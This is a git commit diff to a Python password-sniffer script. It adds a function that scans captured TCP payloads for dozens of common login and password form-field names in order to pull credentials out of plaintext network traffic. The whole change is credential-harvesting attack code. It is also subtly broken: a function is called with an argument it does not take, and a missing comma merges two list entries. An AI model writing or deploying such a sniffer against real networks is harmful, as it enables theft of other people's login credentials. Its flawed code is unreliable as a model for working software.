823f0c11101cbaa65a0c1fa56be525ec39e25009
Juhi S Iyer <juhiiyer@gmail.com>
2021-10-24 12:11:41 +0530

    add functions for username and password

--- security/passwordsniffer/pass-sniffer.py
+++ security/passwordsniffer/pass-sniffer.py
@@ -6,9 +6,35 @@ iface = "eno1"
 
 def get_login_pass():
 
+    user = None
+    passwd = None
+
+    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
+                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
+                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
+                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
+                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
+    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
+                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
+                  'login_password'
+                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']
+
+    for login in userfields:
+        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
+        if login_re:
+            user = login_re.group()
+    for passfield in passfields:
+        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
+        if pass_re:
+            passwd = pass_re.group()
+
+    if user and passwd:
+        return(user, passwd)
+
 def pkt_parser(packet):
     if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
         body = str(packet[TCP].payload)
+        username, password = get_login_pass(body)
 
 try:
     sniff(iface=iface, prn=pkt_parser, store=0)
